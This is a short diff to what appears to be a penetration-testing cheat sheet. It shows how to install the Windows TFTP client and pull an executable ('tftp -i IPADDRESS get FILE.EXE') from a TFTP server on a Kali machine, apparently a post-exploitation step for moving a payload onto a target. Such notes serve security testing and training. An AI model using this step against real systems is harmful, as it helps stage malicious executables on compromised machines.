@@ -2,7 +2,7 @@
 ### Install TFTP (Windows 7, Windows Vista, Windows Server 2008/2008 R2)
 pkgmgr /iu:"TFTP"
 
-C:\>tftp -i IPADDRESS get <file>
+C:\>tftp -i IPADDRESS get FILE.EXE
 	
 Make sure it is set up/running on Kali
 
